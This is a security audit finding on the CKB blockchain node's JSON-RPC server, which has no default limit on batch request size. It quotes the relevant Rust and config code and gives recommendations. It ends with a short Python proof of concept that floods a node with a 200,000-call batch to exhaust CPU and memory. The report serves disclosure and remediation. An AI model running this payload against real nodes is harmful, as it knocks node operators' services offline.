### Title
No Default Enforcement of JSON-RPC Batch Request Size Limit Enables Resource Exhaustion - (File: `rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC server ships with `rpc_batch_limit` disabled by default (`None`). The batch-size guard in `handle_jsonrpc` is only evaluated when the operator has explicitly opted in to a limit. An RPC caller can submit a single JSON-RPC batch request containing an arbitrarily large number of calls (bounded only by the 10 MiB body limit), causing unbounded CPU and memory consumption on the node.

---

### Finding Description

`rpc_batch_limit` is declared as `Option<usize>` with no default value:

```rust
// util/app-config/src/configs/rpc.rs, line 44
pub rpc_batch_limit: Option<usize>,
```

At server startup, the global `JSONRPC_BATCH_LIMIT` static is only populated when the operator explicitly sets the option:

```rust
// rpc/src/server.rs, lines 53-55
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
```

In the HTTP request handler, the guard is conditional on the static being set:

```rust
// rpc/src/server.rs, lines 275-282
if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
    && calls.len() > *batch_size
{
    return make_error_response(...);
}
// If JSONRPC_BATCH_LIMIT is None, all calls proceed unconditionally
let stream = stream::iter(calls)
    .then(move |call| { ... io.handle_call(call, ...) ... });
```

The shipped default configuration explicitly leaves the limit commented out:

```toml
# resource/ckb.toml, lines 205-208
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

The only upstream guard is `max_request_body_size = 10485760` (10 MiB). Within a 10 MiB body, a caller can pack approximately 200,000 minimal JSON-RPC calls (e.g., `get_tip_block_number` at ~50 bytes each). Every call in the batch is dispatched through `io.handle_call`, which involves deserialization, dispatch, and response serialization — all executed sequentially in the async stream, holding the Tokio worker for the duration.

---

### Impact Explanation

A single crafted HTTP POST to the RPC endpoint with a maximally-sized batch body causes the node to process hundreds of thousands of RPC calls synchronously. This exhausts CPU and memory, degrading or halting block processing, transaction relay, and peer synchronization for the duration of the attack. The node does not disconnect or penalize the caller. The attack is repeatable with no cost beyond network bandwidth.

**Impact: High** — sustained node unavailability reachable by any RPC caller.

---

### Likelihood Explanation

The RPC endpoint defaults to `127.0.0.1:8114` (localhost). Any process running on the same host — including scripts, web applications, or other services co-located with the node — qualifies as an RPC caller. Operators who expose the RPC port to a broader network (explicitly warned against but common in practice) face the same attack from any network-reachable client. No authentication, key, or privileged role is required. The attack requires a single HTTP request.

**Likelihood: Medium** — trivially exploitable by any local RPC caller; elevated to High if the port is exposed.

---

### Recommendation

1. **Set a safe non-`None` default** for `rpc_batch_limit` in the `Config` struct (e.g., 100–500 calls) so the limit is enforced without operator action.
2. **Enforce the limit unconditionally** in `handle_jsonrpc` rather than only when the static is populated.
3. Consider also applying the batch limit to the TCP and WebSocket RPC paths, which currently share the same `handle_jsonrpc` handler but may have different framing limits.

---

### Proof of Concept

```python
import json, requests

# Craft a batch of 200,000 lightweight calls within the 10 MiB body limit
calls = [{"jsonrpc":"2.0","method":"get_tip_block_number","params":[],"id":i}
         for i in range(200_000)]
body = json.dumps(calls)          # ~9.8 MiB, under the 10 MiB limit
assert len(body.encode()) < 10 * 1024 * 1024

# Single request; no authentication required
r = requests.post("http://127.0.0.1:8114", data=body,
                  headers={"Content-Type": "application/json"})
# Node CPU pegged; response delayed by seconds to minutes
print(r.status_code, len(r.json()))
```

With `rpc_batch_limit` unset (the default), the node processes all 200,000 calls. Repeating this in a loop causes sustained resource exhaustion. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** util/app-config/src/configs/rpc.rs (L43-44)
```rust
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
```

**File:** rpc/src/server.rs (L34-55)
```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();

#[doc(hidden)]
#[derive(Debug)]
pub struct RpcServer {
    pub http_address: SocketAddr,
    pub tcp_address: Option<SocketAddr>,
    pub ws_address: Option<SocketAddr>,
}

impl RpcServer {
    /// Creates an RPC server.
    ///
    /// ## Parameters
    ///
    /// * `config` - RPC config options.
    /// * `io_handler` - RPC methods handler. See [ServiceBuilder](../service_builder/struct.ServiceBuilder.html).
    /// * `handler` - Tokio runtime handle.
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```
